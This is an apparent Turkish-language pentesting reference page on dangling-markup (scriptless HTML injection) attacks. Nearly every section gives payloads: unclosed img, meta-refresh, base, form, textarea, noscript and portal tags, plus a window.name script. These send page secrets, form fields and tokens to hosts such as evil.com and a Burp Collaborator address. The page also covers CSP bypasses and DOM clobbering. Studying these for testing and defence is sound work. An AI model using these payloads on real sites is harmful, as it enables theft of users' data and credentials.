# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## Özeti

Bu teknik, bir **HTML injection bulunduğunda** bir kullanıcıdan bilgi çıkarmak için kullanılabilir. Bu, **bir şekilde istismar edecek bir yol bulamazsanız** çok faydalıdır [**XSS** ](../xss-cross-site-scripting/) ama **bazı HTML etiketleri enjekte edebiliyorsanız**.\
Ayrıca, HTML'de **açık metin olarak saklanan bazı sırlar** varsa ve bunları istemciden **sızdırmak** istiyorsanız veya bazı script yürütmelerini yanıltmak istiyorsanız da faydalıdır.

Burada yorumlanan birkaç teknik, bilgiyi beklenmedik yollarla (html etiketleri, CSS, http-meta etiketleri, formlar, base...) sızdırarak bazı [**Content Security Policy**](../content-security-policy-csp-bypass/) engellerini aşmak için kullanılabilir.

## Ana Uygulamalar

### Açık metin sırlarını çalmak

Sayfa yüklendiğinde `<img src='http://evil.com/log.cgi?` enjekte ederseniz, kurban size enjekte edilen `img` etiketi ile kod içindeki bir sonraki alıntı arasındaki tüm kodu gönderecektir. Eğer o parçanın içinde bir sır varsa, onu çalacaksınız (aynı şeyi çift alıntı kullanarak da yapabilirsiniz, hangisinin daha ilginç olabileceğine bakın).

Eğer `img` etiketi yasaksa (örneğin CSP nedeniyle) `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` kullanabilirsiniz.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Not edin ki **Chrome, içinde "<" veya "\n" bulunan HTTP URL'lerini** engeller, bu yüzden "ftp" gibi diğer protokol şemalarını deneyebilirsiniz.

Ayrıca CSS `@import`'ı kötüye kullanabilirsiniz (";" bulana kadar tüm kodu gönderecektir).
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Ayrıca **`<table`** kullanabilirsiniz:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Bir `<base` etiketi de ekleyebilirsiniz. Tüm bilgiler alıntı kapatılana kadar gönderilecektir, ancak bu bazı kullanıcı etkileşimleri gerektirir (kullanıcının bir bağlantıya tıklaması gerekir, çünkü base etiketi bağlantının işaret ettiği alan adını değiştirmiş olacaktır):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Formları Çalma
```html
<base href="http://evil.com/" />
```
Sonra, verileri yola gönderen formlar (`<form action='update_profile.php'>` gibi) verileri kötü niyetli alan adına gönderecektir.

### Formları Çalma 2

Bir form başlığı ayarlayın: `<form action='http://evil.com/log_steal'>` bu, bir sonraki form başlığını geçersiz kılacak ve formdan gelen tüm veriler saldırgana gönderilecektir.

### Formları Çalma 3

Buton, formun bilgilerini göndereceği URL'yi "formaction" niteliği ile değiştirebilir:
```html
<button name="xss" type="submit" formaction="https://google.com">
I get consumed!
</button>
```
Bir saldırgan bunu bilgileri çalmak için kullanabilir.

Bu saldırının [**örneğini bu yazıda bulabilirsiniz**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Açık metin sırlarını çalmak 2

Yeni bahsedilen tekniği kullanarak formları çalmak için (yeni bir form başlığı enjekte ederek) ardından yeni bir giriş alanı enjekte edebilirsiniz:
```html
<input type='hidden' name='review_body' value="
```
ve bu giriş alanı, HTML'deki çift tırnakları arasındaki tüm içeriği ve bir sonraki çift tırnağı içerecektir. Bu saldırı, "_**Açık metin sırlarını çalmak**_" ile "_**Formları çalmak2**_" karıştırır.

Aynı şeyi bir form ve bir `<option>` etiketi enjekte ederek de yapabilirsiniz. Kapalı bir `</option>` bulunana kadar tüm veriler gönderilecektir:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Form parametre enjeksiyonu

Bir formun yolunu değiştirebilir ve beklenmedik bir eylemin gerçekleştirilmesi için yeni değerler ekleyebilirsiniz:
```html
<form action="/change_settings.php">
<input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

<form action="/change_settings.php">
← Existing form (ignored by the parser) ...
<input type="text" name="invite_user" value="" /> ← Subverted field ...
<input type="hidden" name="xsrf_token" value="12345" />
...
</form>
</form>
```
### Noscript aracılığıyla düz metin sırlarını çalmak

`<noscript></noscript>` Tarayıcının javascript'i desteklemediği durumlarda içeriği yorumlanacak bir etikettir (Javascript'i Chrome'da [chrome://settings/content/javascript](chrome://settings/content/javascript) adresinden etkinleştirebilir/devre dışı bırakabilirsiniz).

Bir saldırganın kontrolündeki bir siteye, enjeksiyon noktasından sayfanın en altına kadar içeriği dışarı aktarmanın bir yolu, bunu enjekte etmektir:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Kullanıcı Etkileşimi ile CSP'yi Aşma

Bu [portswiggers araştırmasından](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) öğrenebilirsiniz ki, **en kısıtlı CSP** ortamlarından bile bazı **kullanıcı etkileşimleri** ile **veri sızdırmak** mümkündür. Bu durumda kullanacağımız payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Not edin ki **kurban**dan **bir bağlantıya** **tıklamasını** isteyeceksiniz, bu bağlantı onu sizin kontrolünüzdeki **payload**'a **yönlendirecektir**. Ayrıca, **`base`** etiketinin içindeki **`target`** niteliğinin bir sonraki tek tırnak işaretine kadar **HTML içeriği** içereceğini unutmayın.\
Bu, bağlantıya tıklanırsa **`window.name`** değerinin tüm o **HTML içeriği** olacağı anlamına gelir. Bu nedenle, kurbanın bağlantıya tıklayarak eriştiği **sayfayı** kontrol ettiğiniz için, o **`window.name`**'e erişebilir ve bu veriyi **exfiltrate** edebilirsiniz:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Yanıltıcı script iş akışı 1 - HTML ad alanı saldırısı

HTML içinde bir id ile yeni bir etiket ekleyin, bu etiket bir sonraki etiketi geçersiz kılacak ve bir scriptin akışını etkileyecek bir değere sahip olacak. Bu örnekte, bir bilginin kiminle paylaşılacağını seçiyorsunuz:
```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```
### Yanıltıcı script iş akışı 2 - Script ad alanı saldırısı

HTML etiketleri ekleyerek javascript ad alanında değişkenler oluşturun. Ardından, bu değişken uygulamanın akışını etkileyecektir:
```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```
### JSONP'nin Suistimali

Eğer bir JSONP arayüzü bulursanız, rastgele verilerle rastgele bir fonksiyonu çağırma imkanınız olabilir:
```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
Ya da bazı javascript'leri çalıştırmayı deneyebilirsiniz:
```html
<script src="/search?q=a&call=alert(1)"></script>
```
### Iframe istismarı

Bir çocuk belge, ebeveyninin `location` özelliğini görüntüleme ve değiştirme yeteneğine sahiptir, hatta çapraz köken durumlarında bile. Bu, bir **iframe** içinde bir betik yerleştirilmesine ve istemcinin rastgele bir sayfaya yönlendirilmesine olanak tanır:
```html
<html>
<head></head>
<body>
<script>
top.window.location = "https://attacker.com/hacked.html"
</script>
</body>
</html>
```
Bunu şu şekilde hafifletebilirsiniz: `sandbox=' allow-scripts allow-top-navigation'`

Bir iframe, **iframe ad özniteliğini** kullanarak farklı bir sayfadan hassas bilgileri sızdırmak için de kötüye kullanılabilir. Bunun nedeni, kendisini iframe'leyen bir iframe oluşturabilmenizdir; bu, **hassas bilgilerin iframe ad özniteliği içinde görünmesini** sağlayan HTML enjeksiyonunu kötüye kullanır ve ardından o adı başlangıç iframe'inden alıp sızdırabilirsiniz.
```html
<script>
function cspBypass(win) {
win[0].location = "about:blank"
setTimeout(() => alert(win[0].name), 500)
}
</script>

<iframe
src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
onload="cspBypass(this.contentWindow)"></iframe>
```
For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuse

**`meta http-equiv`** kullanarak **birçok işlem** gerçekleştirebilirsiniz, örneğin bir Cookie ayarlamak: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` veya bir yönlendirme yapmak (bu durumda 5 saniye içinde): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Bu, **http-equiv** ile ilgili bir **CSP** ile **önlenebilir** ( `Content-Security-Policy: default-src 'self';`, veya `Content-Security-Policy: http-equiv 'self';`)

### Yeni \<portal HTML tag

\<portal etiketi ile istismar edilebilir güvenlik açıkları hakkında çok **ilginç bir araştırma** bulabilirsiniz [burada](https://research.securitum.com/security-analysis-of-portal-element/).\
Bu yazının yazıldığı anda, portal etiketini Chrome'da `chrome://flags/#enable-portals` adresinden etkinleştirmeniz gerekiyor, aksi takdirde çalışmayacaktır.
```html
<portal src='https://attacker-server?
```
### HTML Sızıntıları

HTML'de bağlantı sızdırmanın tüm yolları Dangling Markup için faydalı olmayabilir, ancak bazen yardımcı olabilir. Onları burada kontrol edin: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Sızıntıları

Bu, **dangling markup ve XS-Sızıntıları** arasında bir **karışım**dır. Bir taraftan, zafiyet **aynı kök**teki bir sayfaya **HTML enjekte etmeye** izin verir (ancak JS değil). Diğer taraftan, HTML enjekte edebileceğimiz sayfayı doğrudan **saldırıya** uğratmayacağız, ama **başka bir sayfayı** hedef alacağız.

{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Arama/XS-Sızıntıları

XS-Arama, **yan kanal saldırılarından** faydalanarak **çapraz köken bilgilerini** **sızdırmaya** yöneliktir. Bu nedenle, Dangling Markup'tan farklı bir tekniktir, ancak bazı teknikler HTML etiketlerinin (JS yürütmesi ile ve olmadan) dahil edilmesini istismar eder, örneğin [**CSS Enjeksiyonu**](../xs-search/#css-injection) veya [**Tembel Yükleme Görselleri**](../xs-search/#image-lazy-loading)**.**

{{#ref}}
../xs-search/
{{#endref}}

## Kaba Kuvvet Tespit Listesi

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt
{{#endref}}

## Referanslar

- [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
- [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{{#include ../../banners/hacktricks-training.md}}
